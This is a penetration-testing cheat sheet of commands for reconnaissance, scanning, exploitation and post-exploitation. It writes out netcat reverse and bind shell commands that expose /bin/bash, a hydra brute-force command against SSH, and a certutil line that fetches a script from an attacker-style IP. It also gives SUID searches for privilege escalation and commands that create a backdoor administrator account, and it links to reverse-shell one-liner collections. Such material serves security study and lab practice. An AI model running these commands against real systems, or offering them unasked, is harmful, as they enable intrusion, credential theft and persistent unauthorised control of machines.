**user / app**
`history`
`service x start`
`systemctl enable x`
`systemctl list-timers`
lists timers waiting to run

type any one of the following command to find os name and version in Linux:
`cat /etc/os-release`
`lsb_release -a`
`hostnamectl`

**network**
`ping -c 1`
obvious
`ifconfig`
`arp -a`
ip to mac ident
`arp-scan -l`
replacement to netdiscover (look for vmware and self)
`netstat -ano`
all ports that are open, what's connected to those ports
`route`
list routing table
`nc`
- example reverse\
target: nc 192.168.129.129 4444 -e /bin/bash\
attacker: nc -nvlp 4444
- example bind\
target: nc -nlvp 444 -e /bin/bash\
attacker: nc 192.168.129.129 444
- on both: first listen, then connect

**services / clients**
`smbclient -L \\host`
`smbclient \\\\host\\share`
connect to the fileshare, list shares

**scanning & enum**
`whatweb`
gather info, versions to lookup vulnerabilities & exploits
`burp suite`
web proxy for intercepting traffic from/to a website
`nmap -p 80 -T4 $ip`
`nmap -T4 -p- -A`
-sn: Ping scan
-Pn: treat all hosts as online
-sU: UDP scan (connection-less > 65k ports, very slow to scan)
`nikto -h https://host`
web vulnerability scanner
`dirbuster`
directory busting, alternatives: `dirb`, `gobuster`
`ffuf -w list.txt:FUZZ -u http://host/FUZZ`
webapp directory fuzzer
`nessus`
vulnerability scanner, extra layer of assesment
`python -m http.server 80`
setup a webserver
`dnsrecon -r 127.0.0.0/24 -n 192.168.129.135`\
reverse search an ip on a given dns server
a webserver might be listening for a specific domain (set on local /etc/hosts					)

**exploit**
`msfcconsole`
`burp suite`
`hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://192.168.129.130:22 -t 4 -V`
brute force tool (can do the same with metasploit)

`linpeas`
`winpeas`
search for possible paths to escalate privileges
`pspy`
Monitor linux processes without root permissions 
`unix reverse shells one liners`
https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
`windows reverse shells one liners`
https://ironhackers.es/en/cheatsheet/comandos-en-windows-para-obtener-shell/
`Unix binaries that can be used to bypass local security restrictions`
https://gtfobins.github.io/

**post**
`hash-identifier`
come up with encryption method of hash
`hashcat`
attempt crack on hashed string
https://www.makeuseof.com/use-hashcat-to-crack-hashes-linux/
`empire`
https://www.ivoidwarranties.tech/posts/pentesting-tuts/empire/guide/
`systeminfo`
on windows get information about the host
`cerutil.exe`
download files (ala wget)
certutil.exe -urlcache -split -f "http://10.10.14.1:8000/winPEAS.bat" winPEAS.bat

`sc stop`
stop processes by name on windoz

```find / -perm -u=s -type f 2>/dev/null```
Find SUID
```find / -perm -g=s -type f 2>/dev/null```
Find GUID
`net user bacon ihazpassword /ADD`
Looking at the output of the ‘net user bacon ihazpassword /ADD’, we have successfully added a user account named “bacon”, from there we could issue **net localgroup administrators bacon /ADD** to get a local administrator on the system itself. We have full control over the system at this point.